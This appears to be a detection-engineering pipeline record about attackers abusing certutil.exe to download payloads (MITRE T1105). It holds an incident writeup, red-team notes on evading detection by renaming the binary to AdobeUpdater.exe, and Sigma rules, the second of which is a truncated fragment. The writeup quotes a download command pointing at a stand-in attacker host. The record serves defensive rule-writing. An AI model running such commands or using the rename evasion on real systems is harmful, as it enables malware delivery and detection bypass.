name: certutil-t1105
raw_threat: Incident writeup: During a recent intrusion, the actor used the signed Windows binary certutil.exe to pull a second-stage executable from an attacker-controlled server. Command lines included 'certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\Temp\payload.exe' and a variant using '-verifyctl'. This is classic living-off-the-land download activity (LOLBin) mapped to MITRE ATT&CK T1105 (Ingress Tool Transfer). Defenders should detect certutil download flags in process-creation telemetry, while avoiding false positives from legitimate certutil hashing and certificate-store operations.

ingest.title: Certutil.exe abused for remote payload download (LOLBin, T1105)
ingest.summary: Threat actors invoke the signed Windows binary certutil.exe with the -urlcache or -verifyctl flags to download attacker-controlled payloads over HTTP, living off the land to bypass application allowlisting. Observed retrieving second-stage executables to disk prior to execution.

extract.description: certutil.exe launched with -urlcache/-verifyctl download flags pointing at a remote URL
extract.rationale: Download switches on a certificate utility are near-exclusively malicious LOLBin usage

corpus.notes: Negatives cover legitimate certutil hashing/store/decode plus a different-tool download.

red_team_r1.description: certutil.exe copied to a business-looking name (AdobeUpdater.exe) and run with -urlcache — same download behavior, defeats an Image-path anchor

red_team_r2.description: Same business-name rename (AdobeUpdater.exe) attempted against the re-authored v2 rule

responses_text.author:
```yaml
title: Certutil LOLBin Remote Download (T1105)
id: certutil-urlcache-download
status: experimental
description: Detects certutil.exe used with download flags to retrieve remote payloads.
references:
  - https://attack.mitre.org/techniques/T1105/
logsource:
  category: process_creation
  product: windows
level: high
detection:
  selection_img:
    Image|endswith: '\certutil.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
  condition: selection_img and selection_flags
falsepositives:
  - Rare administrative CRL retrieval
tags:
  - attack.command_and_control
  - attack.t1105
```

  product: windows
level: high
detection:
  selection_tool:
    OriginalFileName: 'CertUtil.exe'
  selection_flags:
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
  condition: selection_tool and selection_flags

tags:
